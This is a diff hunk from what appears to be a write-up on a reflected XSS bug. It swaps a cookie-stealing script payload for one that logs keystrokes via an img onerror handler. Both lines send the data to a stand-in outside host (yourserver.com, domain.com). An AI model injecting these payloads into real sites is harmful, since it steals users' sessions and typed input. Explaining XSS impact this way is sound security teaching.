@@ -90,7 +90,7 @@ This XSS bug not only modifies the DOM but is reflected in the URL. This means w
 
 Harvesting cookies and shipping them off to a remote server is also quite simple:
 ```
-</h3><script>document.location='http://yourserver.com/cookieharvest.php?d='+document.cookie;</script><h3>
+</h3><img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'><h3>
 ```
 
 From here the possibilities are endless. There are quite a few XSS [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) on the web. Some possible attack scenarios include: 
